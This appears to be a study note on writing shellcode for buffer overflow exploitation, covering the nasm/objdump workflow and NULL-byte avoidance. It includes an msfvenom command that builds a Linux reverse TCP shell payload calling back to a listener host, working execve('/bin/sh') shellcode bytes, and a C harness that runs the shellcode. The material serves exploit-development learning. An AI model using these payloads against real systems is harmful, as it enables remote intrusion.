# shellcode

## theory and definitions

Shellcode is the traditional name for the assembly opcodes that are used during exploitation of a buffer overflow vulnerability, resulting in a shell on the target. The assembly opcodes are what the CPU sees and understands during execution. We have a one to one mapping between assembly instructions and opcodes, everything comes back down to assembly and integers. Fundamentally, if we want the CPU to do something then an opcode must exist to communicate the task to the CPU. 

From an execution flow perspective, the `rip` register contains an address that points to the next opcode to execute. If we can store custom opcode somewhere inside a binary, then if we ever get control over the contents of `rip` register we can execute arbitrary assembly instructions. 


## creating shellcode

> these processes are more art than science, be prepared to be patient do some debugging. Strive to first get a minimal proof of concept

### manual methods

To manually create shell code, the operative must do the following

1. write desired functionality in assembly
2. create an object file with `nasm` or another assembler
3. disassemble with `objdump -D -M intel` to display the opcodes
4. extract the opcode strings from the text-glob output with tools such as `grep`, `sed`, `cut`, and `awk`
5. prepare the resulting hexadecimal string to be compliant with whatever syntax is used for the delivery method. Whether that is is `C-lang` or `python` or otherwise. 
6. Test the payload locally with an appropriate harness, see later on this page


#### cleaning shellcode, avoiding NULLs and bad chars

1. clean registers before use
	1. `xor rdx, rdx`
2. some instructions introduce nulls, such as `mov`. avoid them
	1. accomplish same task with multiple instructions. These instructions do not introduce NULLs:
		1. `add rdx, 0x01`
		2. `sub rdx, 0x01`
		3. `inc rdx`
		4. `dec rdx`
3. if you must use `mov` instruction, use minimal register size appropriate for size of integer
	1. `mov dl, 0x01 ; 1 byte into a 1 byte register`
4. use `rip` relative addressing and store data earlier in the text section to force an offset without NULLs. This is a result of the offset being expressed as a signed integer, a negative number, something like `0xfffffffffffffffc`

The `rip` relative addressing technique is best demonstrated through example. Consider the following assembly. Pay attention to the offset when assessing the output of `objdump -D -M intel`. The offset presents itself in the resulting opcode, this is why an offset such as `0x0000000000000002` introduces NULL bytes. 

```as
global _start

section .text

_start:

	jmp code
	hello_world: db 'hello world', 0x0a

code:
	
	mov al, 1
	xor rdi, rdi
	add rdi, 1
	lea rsi, [rel hello_world]
	xor rdx, rdx
	add rdx, 12
	syscall

	xor rax, rax
	add rax, 60
	xor rdi, rdi
	syscall
	
```

### tool assisted methods

The `msfvenom` utility of the Metasploit framework can be used to create all sorts of payloads, including shellcode. Example shown is for creating a reverse shell for a 64 bit linux target.

```bash
msfvenom -a x64 -p linux/x64/shell_reverse_tcp -b "\x00" -f c LHOST=10.10.10.10 LPORT=8000
```

Notes on the above command

- the `-b` flag allows us to declare "bad chars". Other bad chars include `"\xff"` , `"\x0a"`, and more depending on context of the vulnerability and the target. can be declared en masse via `-b "\xff\x00\x0a"`
- It is not necessary to use the other tools in Metasploit framework to catch the resulting connection, any socket listener will work.


## harness for testing shellcode

The following is shellcode to achieve: `execve( "/bin/sh", {"/bin/sh", NULL}, NULL )`

```c
"\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
```


```c
#include <stdio.h>
#include <string.h>

int main()
{
	unsigned char code[] = ""; // payload goes here after sed/regex or msfvenom
	
	printf(" shell length: %d\n", (int)strlen(code) );
	int (*ret) () = (int(*) ()) code;
	ret();
}
```
